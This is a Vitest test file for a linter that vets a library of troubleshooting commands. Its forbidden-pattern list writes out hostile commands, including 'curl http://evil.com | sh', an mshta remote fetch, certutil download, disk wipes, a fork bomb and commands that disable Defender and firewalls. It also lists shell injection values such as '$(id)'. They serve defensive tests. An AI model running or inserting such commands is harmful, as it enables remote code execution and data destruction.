import { describe, it, expect } from "vitest";
import {
  checkCommandHygiene,
  checkChaining,
  checkPipes,
  checkIdPattern,
  checkKindConsistency,
  checkUndoRequirement,
  checkExplanationLength,
  checkExpectRegex,
  checkGotoTargets,
  checkNextCycles,
  checkParamSafety,
  checkFlows,
  lintLibrary
} from "../src/server/library/lint";
import { renderCommand } from "../src/server/library/render";
import type { Entry, Flow } from "../src/server/library/schema";

function makeEntry(overrides: Partial<Entry> = {}): Entry {
  return {
    id: "linux.test.entry",
    version: 1,
    title: "Test entry",
    kind: "command",
    os: ["ubuntu"],
    shell: "bash",
    category: "bluetooth",
    risk: "read_only",
    needs_admin: false,
    command: "echo hello",
    when_to_use: "test",
    explanation: "A".repeat(80),
    expect: [],
    next: [{ default: "RESOLVED" }],
    undo: null,
    sources: [],
    reviewed_by: null,
    tested_on: [],
    ...overrides
  };
}

describe("command hygiene — forbidden patterns", () => {
  const forbiddenCommands: Array<[string, string]> = [
    ["curl|sh", "curl http://evil.com | sh"],
    ["wget|sh", "wget http://evil.com | sh"],
    ["Invoke-Expression", "Invoke-Expression 'malicious'"],
    ["iex", "echo hello | iex"],
    ["DownloadString", "(New-Object Net.WebClient).DownloadString('http://x')"],
    ["DownloadFile", "(New-Object Net.WebClient).DownloadFile('http://x','y')"],
    ["Start-BitsTransfer", "Start-BitsTransfer -Source http://evil.com"],
    ["certutil urlcache", "certutil -urlcache -split -f http://x"],
    ["encodedcommand", "powershell -encodedcommand abc123"],
    ["FromBase64String", "[System.Convert]::FromBase64String('abc')"],
    ["base64 decode", "echo abc | base64 -d"],
    ["xxd -r", "echo abc | xxd -r"],
    ["char() obfuscation", "echo " + "char(65)"],
    ["windowstyle hidden", "powershell -windowstyle hidden -file x.ps1"],
    ["nohup", "nohup ./evil"],
    ["trailing &", "sleep 10 &"],
    ["disown", "job & disown"],
    ["rm -r", "rm -r /tmp/old"],
    ["rm -f /", "rm -rf /"],
    ["del /s", "del /s /q C:\\temp"],
    ["rd /s", "rd /s /q C:\\temp"],
    ["Remove-Item -Recurse", "Remove-Item -Recurse C:\\temp"],
    ["format", "format C:"],
    ["mkfs", "mkfs.ext4 /dev/sda1"],
    ["dd if=", "dd if=/dev/zero of=/dev/sda"],
    ["diskpart", "diskpart /s script.txt"],
    ["bcdedit", "bcdedit /set testsigning on"],
    ["reg delete", "reg delete HKLM\\Software\\x"],
    [
      "Set-ItemProperty HKLM",
      "Set-ItemProperty -Path HKLM:\\Software\\x -Name y -Value z"
    ],
    ["chmod -R", "chmod -R 777 /"],
    ["chown -R", "chown -R user:group /"],
    ["fork bomb", ":(){ :|:& };:"],
    ["write /dev/sd", "echo x > /dev/sda"],
    ["wipefs", "wipefs -a /dev/sda"],
    ["shred", "shred /etc/passwd"],
    ["Set-ExecutionPolicy", "Set-ExecutionPolicy Unrestricted"],
    ["Set-MpPreference", "Set-MpPreference -DisableRealtimeMonitoring $true"],
    ["setenforce 0", "setenforce 0"],
    ["ufw disable", "ufw disable"],
    ["netsh advfirewall off", "netsh advfirewall set allprofiles state off"],
    ["mshta", "mshta http://evil.com/evil.hta"],
    ["rundll32", "rundll32 evil.dll,EntryPoint"],
    ["regsvr32", "regsvr32 /s evil.dll"],
    ["wmic process call create", "wmic process call create 'cmd.exe'"],
    ["schtasks /create", "schtasks /create /tn evil /tr evil.exe"],
    ["bitsadmin", "bitsadmin /transfer evil http://x C:\\x"]
  ];

  for (const [name, command] of forbiddenCommands) {
    it(`rejects ${name}`, () => {
      const issues = checkCommandHygiene([makeEntry({ command })]);
      expect(issues.length).toBeGreaterThan(0);
      expect(issues.every((i) => i.level === "error")).toBe(true);
    });
  }
});

describe("command hygiene — allowed commands", () => {
  it("accepts a simple echo", () => {
    const issues = checkCommandHygiene([makeEntry({ command: "echo hello" })]);
    expect(issues).toHaveLength(0);
  });

  it("accepts rfkill list", () => {
    const issues = checkCommandHygiene([
      makeEntry({ command: "rfkill list bluetooth" })
    ]);
    expect(issues).toHaveLength(0);
  });

  it("accepts non-ASCII as error", () => {
    const issues = checkCommandHygiene([makeEntry({ command: "echo héllo" })]);
    expect(issues.some((i) => i.rule === "command_ascii")).toBe(true);
  });
});

describe("command length", () => {
  it("rejects commands over 200 chars", () => {
    const issues = checkCommandHygiene([
      makeEntry({ command: "a".repeat(201) })
    ]);
    expect(issues.some((i) => i.rule === "command_length")).toBe(true);
  });

  it("accepts commands at exactly 200 chars", () => {
    const issues = checkCommandHygiene([
      makeEntry({ command: "a".repeat(200) })
    ]);
    expect(issues.some((i) => i.rule === "command_length")).toBe(false);
  });
});

describe("chaining — semicolons", () => {
  it("rejects semicolons", () => {
    const issues = checkChaining([
      makeEntry({ command: "echo hi; rm /tmp/x" })
    ]);
    expect(issues.some((i) => i.rule === "chaining_semicolon")).toBe(true);
  });
});

describe("chaining — compound &&", () => {
  it("rejects && without compound flag", () => {
    const issues = checkChaining([
      makeEntry({ command: "modprobe -r btusb && modprobe btusb" })
    ]);
    expect(issues.some((i) => i.rule === "chaining_compound")).toBe(true);
  });

  it("accepts && with compound flag and clean parts", () => {
    const issues = checkChaining([
      makeEntry({
        command: "sudo modprobe -r btusb && sudo modprobe btusb",
        compound: true
      })
    ]);
    expect(issues.every((i) => i.level !== "error")).toBe(true);
  });
});

describe("pipe allowlist", () => {
  it("accepts pipe to grep", () => {
    const issues = checkPipes([
      makeEntry({ command: "lsusb | grep -i bluetooth" })
    ]);
    expect(issues).toHaveLength(0);
  });

  it("accepts pipe to tr", () => {
    const issues = checkPipes([
      makeEntry({ command: "echo $PATH | tr ':' '\\n'" })
    ]);
    expect(issues).toHaveLength(0);
  });

  it("accepts pipe to Format-Table", () => {
    const issues = checkPipes([
      makeEntry({
        command: "Get-PnpDevice -Class Bluetooth | Format-Table Status, Name",
        shell: "powershell"
      })
    ]);
    expect(issues).toHaveLength(0);
  });

  it("rejects pipe to sh", () => {
    const issues = checkPipes([makeEntry({ command: "curl http://x | sh" })]);
    expect(issues.some((i) => i.rule === "pipe_allowlist")).toBe(true);
  });

  it("rejects pipe to python", () => {
    const issues = checkPipes([makeEntry({ command: "echo x | python3" })]);
    expect(issues.some((i) => i.rule === "pipe_allowlist")).toBe(true);
  });

  it("does not split pipes inside quotes", () => {
    const issues = checkPipes([makeEntry({ command: 'grep "a|b" file.txt' })]);
    expect(issues).toHaveLength(0);
  });
});

describe("id pattern", () => {
  it("accepts linux.sys.os_release", () => {
    const issues = checkIdPattern([makeEntry({ id: "linux.sys.os_release" })]);
    expect(issues).toHaveLength(0);
  });

  it("accepts manual.linux.bt.hard_block", () => {
    const issues = checkIdPattern([
      makeEntry({ id: "manual.linux.bt.hard_block" })
    ]);
    expect(issues).toHaveLength(0);
  });

  it("accepts manual.reboot", () => {
    const issues = checkIdPattern([makeEntry({ id: "manual.reboot" })]);
    expect(issues).toHaveLength(0);
  });

  it("rejects bad id", () => {
    const issues = checkIdPattern([makeEntry({ id: "LINUX.Bad-ID" })]);
    expect(issues.length).toBeGreaterThan(0);
  });
});

describe("kind consistency", () => {
  it("rejects command without command field", () => {
    const issues = checkKindConsistency([
      makeEntry({ kind: "command", command: undefined })
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });

  it("rejects manual with command field", () => {
    const issues = checkKindConsistency([
      makeEntry({
        kind: "manual",
        command: "echo hi",
        manual_steps: ["step 1"],
        shell: "gui"
      })
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });

  it("rejects manual without manual_steps", () => {
    const issues = checkKindConsistency([
      makeEntry({
        kind: "manual",
        command: undefined,
        manual_steps: undefined,
        shell: "gui"
      })
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });
});

describe("undo requirement", () => {
  it("requires undo for safe_change", () => {
    const issues = checkUndoRequirement([
      makeEntry({ risk: "safe_change", undo: null })
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });

  it("requires undo for disruptive", () => {
    const issues = checkUndoRequirement([
      makeEntry({ risk: "disruptive", undo: null })
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });

  it("does not require undo for read_only", () => {
    const issues = checkUndoRequirement([
      makeEntry({ risk: "read_only", undo: null })
    ]);
    expect(issues).toHaveLength(0);
  });
});

describe("explanation length", () => {
  it("rejects short explanations", () => {
    const issues = checkExplanationLength([
      makeEntry({ explanation: "short" })
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });

  it("rejects long explanations", () => {
    const issues = checkExplanationLength([
      makeEntry({ explanation: "A".repeat(701) })
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });

  it("accepts valid length", () => {
    const issues = checkExplanationLength([
      makeEntry({ explanation: "A".repeat(200) })
    ]);
    expect(issues).toHaveLength(0);
  });
});

describe("expect regex compilation", () => {
  it("accepts valid regex", () => {
    const issues = checkExpectRegex([
      makeEntry({
        expect: [{ pattern: "^Soft blocked: yes$", meaning: "test" }]
      })
    ]);
    expect(issues).toHaveLength(0);
  });

  it("rejects invalid regex", () => {
    const issues = checkExpectRegex([
      makeEntry({
        expect: [{ pattern: "[invalid", meaning: "test" }]
      })
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });
});

describe("goto targets", () => {
  it("accepts existing target", () => {
    const issues = checkGotoTargets(
      [
        makeEntry({
          id: "a",
          next: [{ default: "b" }]
        }),
        makeEntry({ id: "b" })
      ],
      new Set(["a", "b"])
    );
    expect(issues).toHaveLength(0);
  });

  it("accepts RESOLVED", () => {
    const issues = checkGotoTargets(
      [makeEntry({ next: [{ default: "RESOLVED" }] })],
      new Set(["linux.test.entry"])
    );
    expect(issues).toHaveLength(0);
  });

  it("rejects missing target", () => {
    const issues = checkGotoTargets(
      [makeEntry({ next: [{ default: "nonexistent" }] })],
      new Set(["linux.test.entry"])
    );
    expect(issues.length).toBeGreaterThan(0);
  });
});

describe("next cycles", () => {
  it("detects a cycle", () => {
    const issues = checkNextCycles([
      makeEntry({ id: "a", next: [{ default: "b" }] }),
      makeEntry({ id: "b", next: [{ default: "a" }] })
    ]);
    expect(issues.length).toBeGreaterThan(0);
  });

  it("accepts a chain to RESOLVED", () => {
    const issues = checkNextCycles([
      makeEntry({ id: "a", next: [{ default: "b" }] }),
      makeEntry({ id: "b", next: [{ default: "RESOLVED" }] })
    ]);
    expect(issues).toHaveLength(0);
  });
});

describe("param safety", () => {
  it("requires anchored regex", () => {
    const issues = checkParamSafety([
      makeEntry({
        command: "echo {{x}}",
        params: {
          x: { type: "regex", pattern: "[a-z]+" }
        }
      })
    ]);
    expect(issues.some((i) => i.rule === "param_regex_anchored")).toBe(true);
  });

  it("accepts anchored regex", () => {
    const issues = checkParamSafety([
      makeEntry({
        command: "echo {{x}}",
        params: {
          x: { type: "regex", pattern: "^[a-z]+$" }
        }
      })
    ]);
    expect(issues).toHaveLength(0);
  });

  it("requires enum values", () => {
    const issues = checkParamSafety([
      makeEntry({
        command: "echo {{x}}",
        params: {
          x: { type: "enum" }
        }
      })
    ]);
    expect(issues.some((i) => i.rule === "param_enum_values")).toBe(true);
  });
});

describe("flows", () => {
  it("rejects flow entry that does not exist", () => {
    const issues = checkFlows(
      [{ os_family: "linux", category: "bluetooth", entry: "nonexistent" }],
      [makeEntry({ id: "linux.test.entry" })]
    );
    expect(issues.length).toBeGreaterThan(0);
  });

  it("accepts valid flow", () => {
    const issues = checkFlows(
      [
        { os_family: "linux", category: "bluetooth", entry: "linux.test.entry" }
      ],
      [makeEntry({ id: "linux.test.entry", os: ["ubuntu"] })]
    );
    expect(issues).toHaveLength(0);
  });
});

describe("renderCommand — param injection", () => {
  const entry = makeEntry({
    command: "command -v {{tool}}",
    params: {
      tool: {
        type: "enum",
        values: ["node", "npm", "git"],
        description: "tool"
      }
    }
  });

  it("substitutes a valid enum value", () => {
    const result = renderCommand(entry, { tool: "node" });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.command).toBe("command -v node");
  });

  it("rejects invalid enum value", () => {
    const result = renderCommand(entry, { tool: "rm" });
    expect(result.ok).toBe(false);
  });

  const injections = [
    ["$(id)", "$(id)"],
    [";rm", ";rm"],
    ["single quote", "'"],
    ["double quote", '"'],
    ["backtick", "`"],
    ["newline", "node\nrm"],
    ["pipe", "node|sh"],
    ["dollar", "$HOME"],
    ["paren", "node(x)"],
    ["angle", "node>x"]
  ];

  for (const [name, value] of injections) {
    it(`rejects injection: ${name}`, () => {
      const result = renderCommand(entry, { tool: value });
      expect(result.ok).toBe(false);
    });
  }
});

describe("renderCommand — regex param", () => {
  const entry = makeEntry({
    command: "echo '{{path}}'",
    params: {
      path: {
        type: "regex",
        pattern: "^[A-Za-z0-9/._-]+$",
        description: "path"
      }
    }
  });

  it("substitutes a valid path", () => {
    const result = renderCommand(entry, { path: "/usr/local/bin" });
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.command).toBe("echo '/usr/local/bin'");
  });

  it("rejects path with semicolon", () => {
    const result = renderCommand(entry, { path: "/usr;rm" });
    expect(result.ok).toBe(false);
  });

  it("rejects path that does not match regex", () => {
    const result = renderCommand(entry, { path: "/usr local/bin" });
    expect(result.ok).toBe(false);
  });
});

describe("renderCommand — no params", () => {
  it("returns the command as-is", () => {
    const entry = makeEntry({ command: "uname -r" });
    const result = renderCommand(entry, {});
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.command).toBe("uname -r");
  });
});

describe("renderCommand — missing param", () => {
  it("rejects when param is not provided", () => {
    const entry = makeEntry({
      command: "echo {{x}}",
      params: { x: { type: "enum", values: ["a"] } }
    });
    const result = renderCommand(entry, {});
    expect(result.ok).toBe(false);
  });
});

describe("renderCommand — unsubstituted placeholder", () => {
  it("rejects if a {{}} remains after substitution", () => {
    const entry = makeEntry({
      command: "echo {{x}} and {{y}}",
      params: {
        x: { type: "enum", values: ["a"] }
      }
    });
    const result = renderCommand(entry, { x: "a" });
    expect(result.ok).toBe(false);
  });
});

describe("full lintLibrary integration", () => {
  it("returns info for unreachable entries", () => {
    const entries = [
      makeEntry({ id: "a", next: [{ default: "RESOLVED" }] }),
      makeEntry({
        id: "b",
        next: [{ default: "RESOLVED" }],
        explanation: "B".repeat(80)
      })
    ];
    const flows: Flow[] = [
      { os_family: "linux", category: "bluetooth", entry: "a" }
    ];
    const issues = lintLibrary(entries, flows);
    const info = issues.filter((i) => i.level === "info" && i.id === "b");
    expect(info.length).toBeGreaterThan(0);
  });
});
